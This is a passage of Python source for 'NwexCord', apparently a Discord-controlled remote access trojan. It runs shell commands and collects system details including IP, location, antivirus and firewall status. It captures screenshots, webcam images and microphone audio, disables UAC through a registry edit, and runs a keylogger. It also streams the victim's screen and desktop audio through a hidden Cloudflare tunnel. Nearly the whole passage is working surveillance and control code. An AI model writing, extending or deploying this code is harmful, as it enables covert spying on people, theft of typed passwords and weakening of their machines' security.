        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="TCP Connections", emoji="🌐", style=discord.ButtonStyle.secondary, row=0)
    async def tcp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed, conns, pg, tp = build_tcp_embed(session_id)
        view = TCPConnectionsView(session_id, pg, conns)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Startup Manager", emoji="🚀", style=discord.ButtonStyle.secondary, row=0)
    async def startup_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        items = StartupManager.get_all_items()
        embed, items = build_startup_embed(session_id, items)
        view = StartupManagerView(session_id, items)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Process Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
    async def process_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        procs = ProcessManager.get_processes()
        embed, procs, pg, tp = build_process_embed(session_id, 0, procs)
        view = ProcessManagerView(session_id, pg, procs)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Service Manager", emoji="🔧", style=discord.ButtonStyle.secondary, row=1)
    async def service_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "service")
    
    @discord.ui.button(label="Clipboard", emoji="📋", style=discord.ButtonStyle.secondary, row=1)
    async def clipboard_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "clipboard")
    
    @discord.ui.button(label="Installed Programs", emoji="💿", style=discord.ButtonStyle.secondary, row=1)
    async def programs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        progs = InstalledProgramsManager.get_programs()
        embed, progs, pg, tp = build_programs_embed(session_id, 0, progs)
        view = InstalledProgramsView(session_id, pg, progs)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Return to the startup info message."""
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())


from flask import Flask, Response
import urllib.request
import re

# ========================================
# System Panel
# ========================================

class SystemManager:
    """Helper class for System panel operations: Screenshot, Webcam, Listener, UAC, KeyLogger, Performance."""

    _keylogger_thread = None
    _keylogger_running = False
    _keylogger_logs = []
    _keylogger_listener = None

    @staticmethod
    def get_monitors():
        """Return a list of bounding boxes for all connected monitors."""
        try:
            import ctypes
            from ctypes import wintypes
            monitors = []
            def _monitor_enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
                r = lprcMonitor.contents
                monitors.append((r.left, r.top, r.right, r.bottom))
                return True
            MonitorEnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(wintypes.RECT), wintypes.LPARAM)
            ctypes.windll.user32.EnumDisplayMonitors(None, None, MonitorEnumProc(_monitor_enum_proc), 0)
            return monitors
        except Exception:
            return []

    @staticmethod
    def take_screenshot(bbox=None):
        """Take a screenshot of a specific bbox or all screens."""
        try:
            from PIL import ImageGrab
            if bbox:
                img = ImageGrab.grab(all_screens=True, bbox=bbox)
            else:
                img = ImageGrab.grab(all_screens=True)
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            return True, buf
        except Exception as e:
            return False, str(e)

    @staticmethod
    def take_webcam():
        """Capture a single frame from the default webcam and return bytes."""
        try:
            import cv2
            # Try multiple backends in order of reliability
            backends = [cv2.CAP_MSMF, cv2.CAP_ANY, cv2.CAP_DSHOW]
            cap = None
            for backend in backends:
                try:
                    cap = cv2.VideoCapture(0, backend)
                    if cap.isOpened():
                        break
                    cap.release()
                    cap = None
                except Exception:
                    if cap:
                        cap.release()
                    cap = None
                    continue
            if cap is None or not cap.isOpened():
                return False, "Webcam could not be opened. No working backend found."
            # Let the camera warm up
            for _ in range(5):
                cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return False, "Failed to capture frame from webcam."
            _, img_encoded = cv2.imencode('.png', frame)
            buf = io.BytesIO(img_encoded.tobytes())
            buf.seek(0)
            return True, buf
        except Exception as e:
            return False, str(e)

    @staticmethod
    def record_microphone(duration_seconds: int):
        """Record microphone audio for the given duration and return WAV bytes."""
        try:
            import sounddevice as sd
            import wave
            import numpy as np

            # Find a real physical microphone, skip virtual/mapper devices
            skip_keywords = ['droidcam', 'virtual', 'stereo mix', 'voicemeeter', 'vb-audio', 'cable', 'sound mapper', 'primary sound']
            mic_device = None
            try:
                devices = sd.query_devices()
                for i, dev in enumerate(devices):
                    if dev['max_input_channels'] > 0 and dev['hostapi'] == 0:
                        name_lower = dev['name'].lower()
                        if not any(kw in name_lower for kw in skip_keywords):
                            mic_device = i
                            break
            except Exception:
                pass

            sample_rate = 44100
            channels = 1

            rec_kwargs = dict(
                frames=int(duration_seconds * sample_rate),
                samplerate=sample_rate,
                channels=channels,
                dtype='int16'
            )
            if mic_device is not None:
                rec_kwargs['device'] = mic_device

            recording = sd.rec(**rec_kwargs)
            sd.wait()

            buf = io.BytesIO()
            with wave.open(buf, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(2)  # 16-bit = 2 bytes
                wf.setframerate(sample_rate)
                wf.writeframes(recording.tobytes())
            buf.seek(0)
            return True, buf
        except Exception as e:
            return False, str(e)

    @staticmethod
    def disable_uac():
        """Disable UAC by setting EnableLUA to 0 in the registry."""
        try:
            cmd = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, "UAC disabled. Restart required to take effect."
            return False, result.stderr.strip() or "Failed to disable UAC."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def start_keylogger():
        """Start the keylogger in a background thread."""
        if SystemManager._keylogger_running:
            return False, "KeyLogger is already running."
        try:
            from pynput import keyboard
            SystemManager._keylogger_logs = []
            SystemManager._keylogger_running = True

            def on_press(key):
                if not SystemManager._keylogger_running:
                    return False
                try:
                    SystemManager._keylogger_logs.append(key.char)
                except AttributeError:
                    special_keys = {
                        keyboard.Key.space: ' ',
                        keyboard.Key.enter: '\n',
                        keyboard.Key.tab: '\t',
                        keyboard.Key.backspace: '[BS]',
                        keyboard.Key.shift: '[SHIFT]',
                        keyboard.Key.shift_r: '[SHIFT]',
                        keyboard.Key.ctrl_l: '[CTRL]',
                        keyboard.Key.ctrl_r: '[CTRL]',
                        keyboard.Key.alt_l: '[ALT]',
                        keyboard.Key.alt_r: '[ALT]',
                        keyboard.Key.caps_lock: '[CAPS]',
                        keyboard.Key.esc: '[ESC]',
                        keyboard.Key.delete: '[DEL]',
                    }
                    SystemManager._keylogger_logs.append(special_keys.get(key, f'[{key.name}]'))

            SystemManager._keylogger_listener = keyboard.Listener(on_press=on_press)
            SystemManager._keylogger_listener.start()
            return True, "KeyLogger started."
        except Exception as e:
            SystemManager._keylogger_running = False
            return False, str(e)

    @staticmethod
    def stop_keylogger():
        """Stop the keylogger and return logged keys."""
        if not SystemManager._keylogger_running:
            return False, "KeyLogger is not running.", ""
        try:
            SystemManager._keylogger_running = False
            if SystemManager._keylogger_listener:
                SystemManager._keylogger_listener.stop()
                SystemManager._keylogger_listener = None
            logged = ''.join(SystemManager._keylogger_logs)
            SystemManager._keylogger_logs = []
            return True, "KeyLogger stopped.", logged
        except Exception as e:
            return False, str(e), ""

    @staticmethod
    def get_keylogger_dump():
        """Get current keylogger logs without stopping."""
        return ''.join(SystemManager._keylogger_logs)

    @staticmethod
    def get_performance():
        """Gather performance data: CPU, RAM, uptime."""
        data = {}
        try:
            import psutil
            data['cpu_percent'] = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            data['ram_total'] = f"{mem.total / (1024**3):.1f} GB"
            data['ram_percent'] = mem.percent
            data['ram_used'] = f"{mem.used / (1024**3):.1f} GB"
            data['ram_free'] = f"{mem.available / (1024**3):.1f} GB"
            data['cpu_count_physical'] = psutil.cpu_count(logical=False) or 'N/A'
            data['cpu_count_logical'] = psutil.cpu_count(logical=True) or 'N/A'
        except Exception:
            data['cpu_percent'] = 'N/A'
            data['ram_total'] = 'N/A'
            data['ram_percent'] = 'N/A'
            data['ram_used'] = 'N/A'
            data['ram_free'] = 'N/A'
            data['cpu_count_physical'] = 'N/A'
            data['cpu_count_logical'] = 'N/A'

        # CPU Name
        try:
            cpu_name = subprocess.check_output('wmic cpu get name', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            data['cpu_name'] = cpu_name if cpu_name else platform.processor()
        except Exception:
            data['cpu_name'] = platform.processor()

        # CPU Speed
        try:
            speed = subprocess.check_output('wmic cpu get CurrentClockSpeed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            max_speed = subprocess.check_output('wmic cpu get MaxClockSpeed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            data['cpu_speed'] = f"{float(max_speed)/1000:.1f} GHz" if max_speed else 'N/A'
            data['cpu_current_speed'] = f"{speed} MHz" if speed else 'N/A'
        except Exception:
            data['cpu_speed'] = 'N/A'
            data['cpu_current_speed'] = 'N/A'

        # RAM Speed
        try:
            ram_speed = subprocess.check_output('wmic memorychip get Speed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            data['ram_speed'] = f"{ram_speed} MHz" if ram_speed else 'N/A'
        except Exception:
            data['ram_speed'] = 'N/A'

        # Uptime
        try:
            boot_str = subprocess.check_output('wmic os get lastbootuptime', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip().split('.')[0]
            boot_time = datetime.strptime(boot_str, '%Y%m%d%H%M%S')
            uptime_delta = datetime.now() - boot_time
            total_minutes = int(uptime_delta.total_seconds() / 60)
            data['uptime'] = f"{total_minutes} Minutes"
        except Exception:
            data['uptime'] = 'N/A'

        return data


class LiveStreamManager:
    """Manager for Flask-based Live Screen streaming with Cloudflare Tunnels."""
    
    _flask_thread = None
    _cf_process = None
    _is_running = False
    _public_url = None
    
    _current_monitor = 0
    _current_res = "720p"
    
    @staticmethod
    def _gen_wav_header(sample_rate, channels, bits_per_sample):
        import struct
        header = b'RIFF'
        header += struct.pack('<L', 0xFFFFFFFF) 
        header += b'WAVE'
        header += b'fmt '
        header += struct.pack('<L', 16) 
        header += struct.pack('<H', 1)  
        header += struct.pack('<H', channels)
        header += struct.pack('<L', sample_rate)
        header += struct.pack('<L', sample_rate * channels * (bits_per_sample // 8))
        header += struct.pack('<H', channels * (bits_per_sample // 8))
        header += struct.pack('<H', bits_per_sample)
        header += b'data'
        header += struct.pack('<L', 0xFFFFFFFF) 
        return header

    @staticmethod
    def _gen_audio_frames():
        import pyaudiowpatch as pyaudio
        p = pyaudio.PyAudio()
        try:
            wasapi_info = p.get_host_api_info_by_type(pyaudio.paWASAPI)
            default_speakers = p.get_device_info_by_index(wasapi_info["defaultOutputDevice"])
            if not default_speakers["isLoopbackDevice"]:
                for loopback in p.get_loopback_device_info_generator():
                    if default_speakers["name"] in loopback["name"]:
                        default_speakers = loopback
                        break
                        
            stream = p.open(format=pyaudio.paInt16,
                channels=default_speakers["maxInputChannels"],
                rate=int(default_speakers["defaultSampleRate"]),
                frames_per_buffer=2048,
                input=True,
                input_device_index=default_speakers["index"],
            )
            
            yield LiveStreamManager._gen_wav_header(
                int(default_speakers["defaultSampleRate"]),
                default_speakers["maxInputChannels"],
                16
            )
            
            while LiveStreamManager._is_running:
                data = stream.read(2048, exception_on_overflow=False)
                yield data
                
        except Exception as e:
            print(f"Audio stream error: {e}")
            yield b""
        finally:
            p.terminate()

    @staticmethod
    def _gen_frames():
        from PIL import ImageGrab
        while LiveStreamManager._is_running:
            try:
                monitors = SystemManager.get_monitors()
                if not monitors:
                    img = ImageGrab.grab(all_screens=True)
                else:
                    idx = LiveStreamManager._current_monitor
                    if idx >= len(monitors) or idx < 0:
                        idx = 0
                    if LiveStreamManager._current_monitor == -1: # All monitors
                        img = ImageGrab.grab(all_screens=True)
                    else:
                        img = ImageGrab.grab(all_screens=True, bbox=monitors[idx])
                
                res = LiveStreamManager._current_res
                if res == "1080p":
                    img.thumbnail((1920, 1080))
                    qual = 70
                elif res == "720p":
                    img.thumbnail((1280, 720))
                    qual = 60
                elif res == "480p":
                    img.thumbnail((854, 480))
                    qual = 40
                else:  # Original
                    qual = 80
                    
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=qual)
                frame = buf.getvalue()
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
                time.sleep(0.05) # Max ~20 FPS
            except Exception:
                time.sleep(0.5)

    @staticmethod
    def _run_flask():
        from flask import Flask, Response, request, stream_with_context, jsonify
        app = Flask(__name__)
        # Suppress Flask logging
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        @app.route('/')
        def index():
            monitors = SystemManager.get_monitors()
            monitor_opts = f'<option value="-1" {"selected" if LiveStreamManager._current_monitor == -1 else ""}>All Monitors</option>'
            for i in range(len(monitors)):
                sel = "selected" if LiveStreamManager._current_monitor == i else ""
                monitor_opts += f'<option value="{i}" {sel}>Monitor {i+1}</option>'
                
            res_opts = ""
            for r in ["1080p", "720p", "480p", "Original"]:
                sel = "selected" if LiveStreamManager._current_res == r else ""
                res_opts += f'<option value="{r}" {sel}>{r}</option>'

            return f'''
            <html>
              <head>
                <title>NwexCord Live Stream</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                  body {{ background-color: #0e0e10; color: #fff; text-align: center; margin: 0; padding: 0; overflow: hidden; font-family: sans-serif; }}
                  #controls {{ position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 8px; z-index: 999; display: flex; gap: 10px; transition: opacity 0.3s; }}
                  #controls:hover {{ opacity: 1; }}
                  select, button {{ background: #2f3136; color: white; border: 1px solid #4f545c; padding: 5px 10px; border-radius: 4px; outline: none; cursor: pointer; }}
                  select:hover, button:hover {{ background: #4f545c; }}
                  img {{ width: 100vw; height: 100vh; object-fit: contain; }}
                </style>
              </head>
              <body>
                <div id="controls">
                  <select id="monitor" onchange="updateSettings()">
                    {monitor_opts}
                  </select>
                  <select id="res" onchange="updateSettings()">
                    {res_opts}
                  </select>
                  <button onclick="document.getElementById('stream_img').src='/stream?'+new Date().getTime()">Refresh Screen</button>
                  <audio id="desktop_audio" controls src="/audio" style="height: 30px;"></audio>
                </div>
                <img id="stream_img" src="/stream" />
                
                <script>
                  let controls = document.getElementById("controls");
                  let timeout;
                  document.addEventListener("mousemove", () => {{
                    controls.style.opacity = "1";
                    clearTimeout(timeout);
                    timeout = setTimeout(() => controls.style.opacity = "0.2", 2000);
                  }});
                  
                  function updateSettings() {{
                    const mon = document.getElementById("monitor").value;
                    const res = document.getElementById("res").value;
                    fetch("/config", {{
                      method: "POST",
                      headers: {{"Content-Type": "application/json"}},
                      body: JSON.stringify({{monitor: mon, resolution: res}})
                    }});
                  }}
                  
                  // Fix strict autoplay policies by playing audio on interaction
                  document.body.addEventListener('click', () => {{
                    let audio = document.getElementById("desktop_audio");
                    if(audio.paused) audio.play();
                  }}, {{once: true}});
                </script>
              </body>
            </html>
            '''

        @app.route('/stream')
        def stream():
            return Response(LiveStreamManager._gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
            
        @app.route('/audio')
        def audio():
            return Response(stream_with_context(LiveStreamManager._gen_audio_frames()), mimetype='audio/wav')
            
        @app.route('/config', methods=['POST'])
        def config():
            data = request.json
            if 'monitor' in data: LiveStreamManager._current_monitor = int(data['monitor'])
            if 'resolution' in data: LiveStreamManager._current_res = data['resolution']
            return jsonify({"status": "ok"})
            
        try:
            app.run(host='127.0.0.1', port=8080, threaded=True, use_reloader=False)
        except Exception as e:
            print(f"Flask execution failed: {e}")

    @staticmethod
    def start_stream():
        if LiveStreamManager._is_running:
            return True, LiveStreamManager._public_url
            
        try:
            # 1. Start Flask in background thread
            LiveStreamManager._is_running = True
            from werkzeug.serving import make_server
            import threading
            
            LiveStreamManager._flask_thread = threading.Thread(target=LiveStreamManager._run_flask, daemon=True)
            LiveStreamManager._flask_thread.start()
            
            # 2. Setup Cloudflared
            if not os.path.exists("cloudflared.exe"):
                # start.bat should have downloaded this. If not, fail cleanly.
                return False, "cloudflared.exe not found! Start the bot via start.bat to install it automatically."
                
            # 3. Start Cloudflared
            LiveStreamManager._cf_process = subprocess.Popen(
                ["cloudflared.exe", "tunnel", "--url", "http://localhost:8080"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            start_time = time.time()
            url = None
            
            # Read stderr to extract the trycloudflare url
            while time.time() - start_time < 15:
                # Use non-blocking read or a small timeout if needed, butreadline is fine here for startup
                line = LiveStreamManager._cf_process.stderr.readline()
                if not line:
                    break
                match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
                if match:
                    url = match.group(1)
                    break
                    
            if url:
                LiveStreamManager._public_url = url
                return True, url
            else:
                LiveStreamManager.stop_stream()
                return False, "Failed to get Cloudflare Tunnel URL within 15 seconds."
                
        except Exception as e:
            LiveStreamManager.stop_stream()
            return False, str(e)

    @staticmethod
    def stop_stream():
        LiveStreamManager._is_running = False
        if LiveStreamManager._cf_process:
            LiveStreamManager._cf_process.terminate()
            try:
                LiveStreamManager._cf_process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                LiveStreamManager._cf_process.kill()
            LiveStreamManager._cf_process = None
            
        # Stopping flask completely requires advanced werkzeug server keeping track. 
        # But we made the thread daemon, and we shut down the stream generating loop.
        # It's fine to leave Flask hanging in daemon, or we could just kill the process instead, but daemon is fine.
        LiveStreamManager._public_url = None
        return True, "Live stream stopped successfully."


def _progress_bar(percent, length=10):
    """Create a text-based progress bar."""
    if isinstance(percent, str):
        return '░' * length
    filled = int(length * percent / 100)
    bar = '█' * filled + '░' * (length - filled)
    return bar


def build_performance_embed(session_id: str, data: dict = None):
    """Build the Performance embed similar to the reference image."""
    if data is None:
        data = SystemManager.get_performance()

    cpu_pct = data.get('cpu_percent', 'N/A')
    ram_pct = data.get('ram_percent', 'N/A')

    cpu_bar = _progress_bar(cpu_pct)
    ram_bar = _progress_bar(ram_pct)

    cpu_pct_str = f"{cpu_pct}%" if isinstance(cpu_pct, (int, float)) else cpu_pct
    ram_pct_str = f"{ram_pct}%" if isinstance(ram_pct, (int, float)) else ram_pct

    embed = discord.Embed(
        title=f"⚡ Performance : {session_id}",
        color=discord.Color.from_rgb(0, 120, 215)
    )

    # CPU Section
    cpu_info = (
        f"**CPU :** {data.get('cpu_name', 'Unknown')}\n\n"
        f"```\n"
        f"  Usage    [{cpu_bar}] {cpu_pct_str}\n"
        f"```\n"
        f"🟩 **Speed** : {data.get('cpu_speed', 'N/A')}\n"
        f"🟩 **Cores** : {data.get('cpu_count_physical', 'N/A')}\n"
        f"🟩 **Logical** : {data.get('cpu_count_logical', 'N/A')}"
    )
    embed.add_field(name="🧠 CPU", value=cpu_info, inline=False)

    # RAM Section
    ram_info = (
        f"**RAM :** {data.get('ram_total', 'Unknown')}\n\n"
        f"```\n"
        f"  Usage    [{ram_bar}] {ram_pct_str}\n"
        f"```\n"
        f"🟧 **Speed** : {data.get('ram_speed', 'N/A')}\n"
        f"🟧 **Used** : {data.get('ram_used', 'N/A')}\n"
        f"🟧 **Free** : {data.get('ram_free', 'N/A')}"
    )
    embed.add_field(name="💾 RAM", value=ram_info, inline=False)

    # Uptime
    embed.add_field(
        name="⏱️ SystemUpTime",
        value=f"🕐 **{data.get('uptime', 'N/A')}**",
        inline=False
    )

    embed.set_footer(text=f"NwexCord • Performance Monitor")
    return embed


class PerformanceView(discord.ui.View):
    """Interactive view for Performance with Stop (refresh toggle) and Back."""
    def __init__(self, session_id: str = ""):
        super().__init__(timeout=300)
        self.session_id = session_id

    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=0)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        data = SystemManager.get_performance()
        embed = build_performance_embed(self.session_id, data)
        await interaction.response.edit_message(content=None, embed=embed, view=PerformanceView(self.session_id))

    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=0)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())


class ListenerDurationModal(discord.ui.Modal, title="Microphone Listener"):
    """Modal to input recording duration in seconds."""
    duration_input = discord.ui.TextInput(
        label="Duration (seconds)",
        placeholder="e.g. 10",
        default="5",
        required=True,
        max_length=4
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            duration = int(str(self.duration_input).strip())
            if duration < 1 or duration > 300:
                await interaction.response.send_message("❌ Duration must be between 1 and 300 seconds.", ephemeral=True)
                return
        except ValueError:
            await interaction.response.send_message("❌ Please enter a valid number.", ephemeral=True)
            return

        loading_embed = discord.Embed(
            title="🎙️ Microphone Listener",
            description=f"⏳ Recording for **{duration} seconds**...\nPlease wait.",
            color=discord.Color.orange()
        )
        loading_embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading_embed, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, SystemManager.record_microphone, duration)

        if success:
            file = discord.File(result, filename=f"recording_{duration}s.wav")
            done_embed = discord.Embed(
                title="🎙️ Microphone Listener",
                description=f"✅ Recorded **{duration} seconds** of audio.",
                color=discord.Color.green()
            )
            done_embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=done_embed, attachments=[file], view=SystemResultView())
        else:
            err_embed = discord.Embed(
                title="🎙️ Microphone Listener",
                description=f"❌ {result}",
                color=discord.Color.red()
            )
            err_embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=err_embed, view=SystemResultView())


def embed_system_panel():
    """Create the System panel embed."""
    embed = discord.Embed(
        title="⚙️ NwexCord System",
        description=(
            "Select a system action from the buttons below.\n\n"
            "📸 **ScreenShot** — Capture the PC screen\n"
            "📷 **Webcam** — Capture webcam photo\n"
            "📺 **Live Screen** — Stream screen to browser\n"
            "🎙️ **Listener** — Record microphone audio\n"
            "🛡️ **Disable UAC** — Disable User Account Control\n"
            "⌨️ **KeyLogger** — Start/Stop key logging\n"
            "⚡ **Performance** — CPU, RAM & uptime stats"
        ),
        color=discord.Color.from_rgb(47, 49, 54)
    )
    embed.set_footer(text="NwexCord • System Panel")
    return embed


class LiveStreamView(discord.ui.View):
    """View to manage the active Live Stream."""
    def __init__(self, url):
        super().__init__(timeout=None)
        self.url = url
        
        # Open Browser Button
        btn = discord.ui.Button(label="Open Stream in Browser", url=url, style=discord.ButtonStyle.link, emoji="🌐")
        self.add_item(btn)

    @discord.ui.button(label="Stop Stream", emoji="⏹", style=discord.ButtonStyle.danger)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        SystemManager.stop_stream = LiveStreamManager.stop_stream
        success, msg = LiveStreamManager.stop_stream()
        embed = discord.Embed(title="⏹ Live Screen Stopped", description=msg, color=discord.Color.green())
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=SystemResultView())

class SystemResultView(discord.ui.View):
    """Back button after a system action result."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())


class ScreenShotSelectView(discord.ui.View):
    """View to select which monitor to screenshot."""
    def __init__(self, monitors):
        super().__init__(timeout=300)
        self.monitors = monitors
        
        # Add a button for each monitor
        for i, bbox in enumerate(monitors):
            btn = discord.ui.Button(label=f"Monitor {i+1}", style=discord.ButtonStyle.primary)
            btn.callback = self.make_callback(bbox, str(i+1))
            self.add_item(btn)
            
        # Add capture all button
        all_btn = discord.ui.Button(label="All Monitors", style=discord.ButtonStyle.success)
        all_btn.callback = self.make_callback(None, "All")
        self.add_item(all_btn)

        # Add back button
        back_btn = discord.ui.Button(label="Back", style=discord.ButtonStyle.secondary)
        back_btn.callback = self.back_callback
        self.add_item(back_btn)

    def make_callback(self, bbox, name):
        async def callback(interaction: discord.Interaction):
            loading = discord.Embed(title="📸 ScreenShot", description=f"⏳ Capturing Screen {name}...", color=discord.Color.greyple())
            loading.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=loading, view=None)

            loop = asyncio.get_event_loop()
            success, result = await loop.run_in_executor(None, SystemManager.take_screenshot, bbox)

            if success:
                file = discord.File(result, filename=f"screenshot_{name}.png")
                embed = discord.Embed(title="📸 ScreenShot", description=f"✅ Screen {name} captured successfully.", color=discord.Color.green())
                embed.set_image(url=f"attachment://screenshot_{name}.png")
                embed.set_footer(text="NwexCord • System")
                await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
            else:
                embed = discord.Embed(title="📸 ScreenShot", description=f"❌ {result}", color=discord.Color.red())
                embed.set_footer(text="NwexCord • System")
                await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
        return callback

    async def back_callback(self, interaction: discord.Interaction):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())


class SystemPanelView(discord.ui.View):
    """Main System panel with 6 feature buttons."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="ScreenShot", emoji="📸", style=discord.ButtonStyle.secondary, row=0)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        monitors = SystemManager.get_monitors()
        if monitors and len(monitors) > 1:
            embed = discord.Embed(
                title="📸 ScreenShot", 
                description=f"Multiple monitors detected ({len(monitors)}). Please select a screen to capture.", 
                color=discord.Color.blurple()
            )
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, view=ScreenShotSelectView(monitors))
            return

        loading = discord.Embed(title="📸 ScreenShot", description="⏳ Capturing screen...", color=discord.Color.greyple())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, SystemManager.take_screenshot, None)

        if success:
            file = discord.File(result, filename="screenshot.png")
            embed = discord.Embed(title="📸 ScreenShot", description="✅ Screen captured successfully.", color=discord.Color.green())
            embed.set_image(url="attachment://screenshot.png")
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
        else:
            embed = discord.Embed(title="📸 ScreenShot", description=f"❌ {result}", color=discord.Color.red())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="Webcam", emoji="📷", style=discord.ButtonStyle.secondary, row=0)
    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        loading = discord.Embed(title="📷 Webcam", description="⏳ Capturing webcam...", color=discord.Color.greyple())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, SystemManager.take_webcam)

        if success:
            file = discord.File(result, filename="webcam.png")
            embed = discord.Embed(title="📷 Webcam", description="✅ Webcam captured successfully.", color=discord.Color.green())
            embed.set_image(url="attachment://webcam.png")
            embed.set_footer(text="NwexCord • System")
